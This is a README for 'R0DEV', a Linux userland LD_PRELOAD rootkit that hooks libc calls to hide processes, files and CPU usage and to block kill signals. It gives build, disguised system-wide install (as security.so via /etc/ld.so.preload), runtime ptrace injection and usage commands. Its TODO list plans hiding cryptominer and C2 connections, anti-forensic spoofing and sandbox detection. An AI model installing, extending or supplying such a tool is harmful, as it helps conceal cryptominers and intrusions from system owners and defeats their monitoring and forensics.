# R0DEV — Userland LD_PRELOAD Rootkit

Hooks `readdir`, `stat`, `openat`, `open`, `fopen`, `read`, `kill` to hide
processes, files, and CPU usage on Linux. Runtime injection via `ptrace`.

No LKM. No kernel symbols. No `kprobe`. Works on any kernel with `glibc`.

## Build

```bash
make          # rootkit.so + fix_rootkit + forcekill + injector
make strip    # strip debug info (OPSEC)
make clean
```

## Install

```bash
# System-wide (all new processes)
sudo cp rootkit.so /lib/x86_64-linux-gnu/security.so
echo /lib/x86_64-linux-gnu/security.so | sudo tee /etc/ld.so.preload

# Per-process
LD_PRELOAD=./rootkit.so bash
```

## Usage

Run any binary with the prefix in its name:

```bash
# Hidden from ps, /proc, top. Kill-protected. CPU hidden.
exec -a R0Dev_binary /path/to/binary
./r0run.sh /path/to/binary            # wrapper
```

Runtime injection into a running process:

```bash
sudo ./injector <pid> ./rootkit.so
```

Remove:

```bash
sudo ./fix_rootkit
```

## Configuration

| Variable | Default | Description |
|---|---|---|
| `R0DEV_PREFIX` | `r0dev` | Case-insensitive prefix for hide/kill protection |

## Hooks

| Function | What it hooks | Effect |
|---|---|---|
| `readdir()` | `/proc` dir listing | Hides PID dirs + files matching prefix |
| `readdir64()` | `/proc` dir listing | Same, 64-bit variant |
| `open()` | File open | `/proc/stat` returns memfd with CPU subtracted |
| `openat()` | File open (modern) | `/proc/stat` returns memfd with CPU subtracted |
| `fopen()` | File open (stdio) | `/proc/stat` returns modified FILE stream |
| `read()` | Any fd | Subtracts CPU from in-flight `/proc/stat` reads |
| `kill()` | Signal delivery | Blocks SIGKILL/SIGTERM to hidden processes |
| `stat()` | File metadata | Hides files matching prefix (`ENOENT`) |
| `lstat()` | File metadata | Hides files matching prefix |
| `fstatat()` | File metadata (modern) | Hides files matching prefix |

## Architecture

```
┌─────────────────────────────────────────────────┐
│                 Any Process                       │
│  ┌──────────────────────────────────────────┐    │
│  │              libc (glibc)                  │    │
│  │  readdir() ⊂-- dlsym(RTLD_NEXT)           │    │
│  │  open()     ⊂-- security.so (hook)         │    │
│  │  kill()     ⊂-- (returns 0 if hidden)      │    │
│  └──────────────────────────────────────────┘    │
│                    ↕ LD_PRELOAD                  │
│  ┌──────────────────────────────────────────┐    │
│  │              security.so                    │    │
│  │  → has_prefix() → match → hide/modify      │    │
│  │  → no match → pass through to real libc     │    │
│  └──────────────────────────────────────────┘    │
└─────────────────────────────────────────────────┘
```

## TODO

- [ ] **ksystemstats CPU hiding** — KDE's system monitor reads CPU via
  `libksysguard` / `libstat` which may bypass `/proc/stat` hooks. Needs
  `connect()` hook or D-Bus signal interception.

- [ ] **injector stabilization** — ptrace injection fails on
  multi-threaded processes. Use `process_vm_writev` + `dlopen` via
  remote thread instead.

- [ ] **`/proc/net/tcp` hook** — Hide outbound connections
  (miner pool, C2) from `ss` / `netstat`.

- [ ] **`uname()` hook** — Spoof kernel version string for
  anti-forensics.

- [ ] **`statx()` hook** — Modern `stat` syscall wrapper
  (Linux 4.11+).

- [ ] **Randomized prefix** — Generate unique prefix at install time
  instead of hardcoded `r0dev`.

- [ ] **Config file** — Replace env var with `/etc/r0dev.conf` for
  silent configuration.

- [ ] **ARM64 build** — Cross-compile support for aarch64.

- [ ] **Sandbox detection** — Skip hooks under `strace`, `gdb`,
  virtualized environments.

- [ ] **Fix `has_prefix()`** — Current byte-by-byte scan has edge
  cases with substrings of the prefix.

- [ ] **Self-cleaning on crash** — If rootkit.so is removed without
  running `fix_rootkit`, `ld.so.preload` still points to a missing
  file; all processes hang on load. Add fail-safe.

## See Also

- [R0DEV LKM branch](https://github.com/K0D3IN/R0DEV) — Kernel module
  variant (syscall table hook, deprecated)

## License

MIT
